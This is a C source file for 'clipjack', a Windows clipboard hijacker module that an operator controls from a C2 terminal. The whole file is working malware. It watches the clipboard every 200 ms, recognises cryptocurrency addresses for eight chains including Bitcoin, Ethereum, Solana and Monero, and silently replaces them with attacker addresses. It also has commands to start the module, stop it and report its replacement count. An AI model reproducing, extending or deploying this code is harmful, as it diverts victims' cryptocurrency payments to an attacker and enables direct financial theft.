/*
 * clipjack.c — Clipboard address hijacker
 *
 * Monitors the clipboard every 200 ms via GetClipboardSequenceNumber().
 * When a cryptocurrency address is detected, silently replaces it with
 * the attacker's address for the same chain.
 *
 * Supported chains:
 *   BTC   — Legacy (1...), P2SH (3...), Bech32 (bc1...)
 *   ETH   — 0x + 40 hex  (covers BSC, AVAX, MATIC, ARB, etc.)
 *   SOL   — base58 43-44 chars
 *   XMR   — 4... 95 chars
 *   LTC   — L..., M..., ltc1...
 *   DOGE  — D... 34 chars
 *   TRON  — T... 34 base58 chars
 *   XRP   — r... 25-34 chars
 *
 * Usage (from C2 terminal):
 *   clipjack start btc=<ADDR> eth=<ADDR> sol=<ADDR> ...
 *   clipjack stop
 *   clipjack status
 *
 * Multiple chains can be specified in any order.
 * Chains not specified are not hijacked.
 */

#include "commands.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>

/* ── attacker address table ───────────────────────────────────────────── */

#define MAX_ADDR 64

typedef struct {
    char chain[16];         /* "btc", "eth", "sol", ... */
    char        addr[MAX_ADDR];
} _cj_entry_t;

#define MAX_CHAINS 16

static _cj_entry_t s_addrs[MAX_CHAINS];
static int         s_naddrs = 0;

/* ── background thread state ──────────────────────────────────────────── */

static HANDLE        s_thread  = NULL;
static volatile LONG s_running = 0;
static volatile LONG s_hits    = 0;

/* ── address detection helpers ────────────────────────────────────────── */

static int _is_base58_char(char c)
{
    return (c >= '1' && c <= '9') ||
           (c >= 'A' && c <= 'H') ||
           (c >= 'J' && c <= 'N') ||
           (c >= 'P' && c <= 'Z') ||
           (c >= 'a' && c <= 'k') ||
           (c >= 'm' && c <= 'z');
}

static int _is_hex_char(char c)
{
    return (c >= '0' && c <= '9') ||
           (c >= 'a' && c <= 'f') ||
           (c >= 'A' && c <= 'F');
}

static int _is_bech32_char(char c)
{
    /* bech32 charset: q p z r y 9 x 8 g f 2 t v d w 0 s 3 j n 5 4 k h c e 6 m u a 7 l */
    static const char *bc = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
    char lc = (char)tolower((unsigned char)c);
    return strchr(bc, lc) != NULL;
}

/* returns chain name if text is a known crypto address, NULL otherwise */
static const char *_detect_chain(const char *text, size_t len)
{
    if (len < 25) return NULL;

    /* Ethereum / EVM (0x + 40 hex) */
    if (len == 42 && text[0] == '0' && text[1] == 'x') {
        int ok = 1;
        for (int i = 2; i < 42 && ok; i++)
            if (!_is_hex_char(text[i])) ok = 0;
        if (ok) return "eth";
    }

    /* Bitcoin Bech32 (bc1q... or bc1p...) */
    if (len >= 42 && len <= 62 &&
        tolower((unsigned char)text[0]) == 'b' &&
        tolower((unsigned char)text[1]) == 'c' &&
        text[2] == '1') {
        int ok = 1;
        for (size_t i = 3; i < len && ok; i++)
            if (!_is_bech32_char(text[i])) ok = 0;
        if (ok) return "btc";
    }

    /* Bitcoin Legacy / P2SH (base58, 25-34 chars, starts with 1 or 3) */
    if (len >= 25 && len <= 34 &&
        (text[0] == '1' || text[0] == '3')) {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "btc";
    }

    /* Solana (base58, 43-44 chars, no O/I/0/l) */
    if (len >= 43 && len <= 44 && _is_base58_char(text[0])) {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "sol";
    }

    /* Monero (4... 95 chars, base58) */
    if (len == 95 && text[0] == '4') {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "xmr";
    }

    /* TRON (T... 34 base58 chars) */
    if (len == 34 && text[0] == 'T') {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "trx";
    }

    /* Dogecoin (D... 34 base58 chars) */
    if (len == 34 && text[0] == 'D') {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "doge";
    }

    /* Litecoin Legacy (L... or M... 34 base58) */
    if (len == 34 && (text[0] == 'L' || text[0] == 'M')) {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "ltc";
    }

    /* Litecoin Bech32 (ltc1...) */
    if (len >= 42 && len <= 62 &&
        tolower((unsigned char)text[0]) == 'l' &&
        tolower((unsigned char)text[1]) == 't' &&
        tolower((unsigned char)text[2]) == 'c' &&
        text[3] == '1') {
        int ok = 1;
        for (size_t i = 4; i < len && ok; i++)
            if (!_is_bech32_char(text[i])) ok = 0;
        if (ok) return "ltc";
    }

    /* XRP (r... 25-34 base58) */
    if (len >= 25 && len <= 34 && text[0] == 'r') {
        int ok = 1;
        for (size_t i = 0; i < len && ok; i++)
            if (!_is_base58_char(text[i])) ok = 0;
        if (ok) return "xrp";
    }

    return NULL;
}

/* lookup attacker address for chain (case-insensitive) */
static const char *_get_attacker_addr(const char *chain)
{
    for (int i = 0; i < s_naddrs; i++)
        if (_stricmp(s_addrs[i].chain, chain) == 0)
            return s_addrs[i].addr;
    return NULL;
}

/* ── clipboard read/write ─────────────────────────────────────────────── */

/*
 * Read plain text from clipboard.
 * Returns malloc'd NUL-terminated string, or NULL. Caller frees.
 */
static char *_clip_read(void)
{
    if (!OpenClipboard(NULL)) return NULL;

    HANDLE h = GetClipboardData(CF_TEXT);
    char *result = NULL;
    if (h) {
        const char *raw = (const char *)GlobalLock(h);
        if (raw) {
            size_t len = strlen(raw);
            result = (char *)malloc(len + 1);
            if (result) { memcpy(result, raw, len + 1); }
            GlobalUnlock(h);
        }
    }

    CloseClipboard();
    return result;
}

/*
 * Replace clipboard text with replacement.
 * Returns 1 on success.
 */
static int _clip_write(const char *text)
{
    size_t len  = strlen(text) + 1;
    HGLOBAL hg  = GlobalAlloc(GMEM_MOVEABLE, len);
    if (!hg) return 0;

    char *dst = (char *)GlobalLock(hg);
    if (!dst) { GlobalFree(hg); return 0; }
    memcpy(dst, text, len);
    GlobalUnlock(hg);

    if (!OpenClipboard(NULL)) { GlobalFree(hg); return 0; }
    EmptyClipboard();
    HANDLE placed = SetClipboardData(CF_TEXT, hg);
    CloseClipboard();

    if (!placed) { GlobalFree(hg); return 0; }
    return 1;
}

/* ── monitor thread ───────────────────────────────────────────────────── */

static DWORD WINAPI _monitor_thread(LPVOID arg)
{
    (void)arg;

    DWORD last_seq = GetClipboardSequenceNumber();

    while (InterlockedCompareExchange(&s_running, 1, 1) == 1) {
        Sleep(200);

        DWORD seq = GetClipboardSequenceNumber();
        if (seq == last_seq) continue;
        last_seq = seq;

        char *text = _clip_read();
        if (!text) continue;

        /* trim trailing whitespace / newlines */
        size_t len = strlen(text);
        while (len > 0 && (text[len-1] == '\n' || text[len-1] == '\r' ||
                           text[len-1] == ' '  || text[len-1] == '\t'))
            text[--len] = 0;

        if (len == 0) { free(text); continue; }

        const char *chain = _detect_chain(text, len);
        if (!chain) { free(text); continue; }

        const char *attacker = _get_attacker_addr(chain);
        if (!attacker) { free(text); continue; }

        /* don't replace if already our address */
        if (strcmp(text, attacker) == 0) { free(text); continue; }

        _clip_write(attacker);
        InterlockedIncrement(&s_hits);

        free(text);
    }

    return 0;
}

/* ── public API ───────────────────────────────────────────────────────── */

/*
 * args format: "start [chain=addr ...] | stop | status"
 *
 * Examples:
 *   clipjack start btc=1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf... eth=0xdead...
 *   clipjack stop
 *   clipjack status
 */
int cmd_clipjack(const char *args, char *output_buf, size_t output_size)
{
    if (!args || !args[0]) {
        snprintf(output_buf, output_size,
                 "[clipjack] usage: start [chain=addr ...] | stop | status\n");
        return -1;
    }

    /* "stop" */
    if (_strnicmp(args, "stop", 4) == 0) {
        if (!InterlockedCompareExchange(&s_running, 0, 1)) {
            snprintf(output_buf, output_size, "[clipjack] not running\n");
            return 1;
        }
        InterlockedExchange(&s_running, 0);
        if (s_thread) {
            WaitForSingleObject(s_thread, 2000);
            CloseHandle(s_thread);
            s_thread = NULL;
        }
        s_naddrs = 0;
        snprintf(output_buf, output_size,
                 "[clipjack] stopped  (total replacements: %ld)\n",
                 (long)s_hits);
        InterlockedExchange(&s_hits, 0);
        return 0;
    }

    /* "status" */
    if (_strnicmp(args, "status", 6) == 0) {
        int running = (InterlockedCompareExchange(&s_running, 1, 1) == 1);
        size_t pos = 0;
        int n = snprintf(output_buf, output_size,
                         "[clipjack] %s  hits=%ld  chains=%d\n",
                         running ? "RUNNING" : "stopped",
                         (long)s_hits, s_naddrs);
        if (n > 0) pos += (size_t)n;
        for (int i = 0; i < s_naddrs && pos + 80 < output_size; i++) {
            n = snprintf(output_buf + pos, output_size - pos,
                         "  %-6s → %s\n",
                         s_addrs[i].chain, s_addrs[i].addr);
            if (n > 0) pos += (size_t)n;
        }
        return 0;
    }

    /* "start [chain=addr ...]" */
    if (_strnicmp(args, "start", 5) != 0) {
        snprintf(output_buf, output_size,
                 "[clipjack] unknown subcommand: %s\n", args);
        return -1;
    }

    if (InterlockedCompareExchange(&s_running, 1, 1) == 1) {
        snprintf(output_buf, output_size,
                 "[clipjack] already running — stop first\n");
        return 1;
    }

    /* parse chain=addr pairs */
    s_naddrs = 0;
    const char *p = args + 5; /* skip "start" */
    while (*p == ' ') p++;

    while (*p && s_naddrs < MAX_CHAINS) {
        /* find '=' */
        const char *eq = strchr(p, '=');
        if (!eq) break;

        size_t chain_len = (size_t)(eq - p);
        if (chain_len == 0 || chain_len >= 16) { p = eq + 1; continue; }

        /* chain name */
        char chain[16] = {0};
        memcpy(chain, p, chain_len);

        /* addr: up to next space or end */
        const char *vs = eq + 1;
        const char *ve = vs;
        while (*ve && *ve != ' ') ve++;
        size_t addr_len = (size_t)(ve - vs);

        if (addr_len > 0 && addr_len < MAX_ADDR) {
            strncpy(s_addrs[s_naddrs].chain, chain, 15);
            s_addrs[s_naddrs].chain[15] = 0;
            memcpy(s_addrs[s_naddrs].addr, vs, addr_len);
            s_addrs[s_naddrs].addr[addr_len] = 0;
            s_naddrs++;
        }

        p = *ve ? ve + 1 : ve;
    }

    if (s_naddrs == 0) {
        snprintf(output_buf, output_size,
                 "[clipjack] no addresses provided — "
                 "usage: start btc=ADDR eth=ADDR ...\n");
        return -1;
    }

    InterlockedExchange(&s_running, 1);
    InterlockedExchange(&s_hits, 0);

    s_thread = CreateThread(NULL, 0, _monitor_thread, NULL, 0, NULL);
    if (!s_thread) {
        InterlockedExchange(&s_running, 0);
        snprintf(output_buf, output_size,
                 "[clipjack] CreateThread failed: %lu\n", GetLastError());
        return -1;
    }

    /* confirmation */
    size_t pos = 0;
    int n = snprintf(output_buf, output_size,
                     "[clipjack] started  monitoring %d chain(s)\n", s_naddrs);
    if (n > 0) pos += (size_t)n;
    for (int i = 0; i < s_naddrs && pos + 80 < output_size; i++) {
        n = snprintf(output_buf + pos, output_size - pos,
                     "  %-6s → %s\n",
                     s_addrs[i].chain, s_addrs[i].addr);
        if (n > 0) pos += (size_t)n;
    }
    return 0;
}
